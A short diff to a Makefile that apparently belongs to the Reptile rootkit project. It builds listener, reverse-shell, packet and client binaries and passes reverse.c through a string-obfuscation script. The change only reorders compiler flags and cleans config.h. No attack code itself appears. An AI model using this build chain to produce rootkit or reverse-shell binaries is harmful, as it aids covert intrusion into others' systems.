@@ -9,13 +9,13 @@ listener:
 	cp listener ../bin
 
 reverse:
-	cat reverse.c | perl ../scripts/destringify.pl | gcc -O -W -Wall -o reverse $(SERVER_OBJ) -D_REPTILE_ -lutil -xc -
+	cat reverse.c | perl ../scripts/destringify.pl | gcc -O -W -Wall -o reverse $(SERVER_OBJ) -D_REPTILE_ -xc -lutil -
 	#gcc -O -W -Wall -o reverse $(SERVER_OBJ) -lutil
 	strip reverse
 	cp reverse ../bin
 
 standalone_reverse:
-	cat reverse.c | perl ../scripts/destringify.pl | gcc -O -W -Wall -o reverse $(SERVER_OBJ) -lutil -xc -
+	cat reverse.c | perl ../scripts/destringify.pl | gcc -O -W -Wall -o reverse $(SERVER_OBJ) -xc -lutil -
 	#gcc -O -W -Wall -o reverse $(SERVER_OBJ) -lutil
 	strip reverse
 	cp reverse ../bin
@@ -37,4 +37,4 @@ client:
 	cp client ../bin
 
 clean:
-	rm -f listener reverse packet cmd client
+	rm -f listener reverse packet cmd client config.h
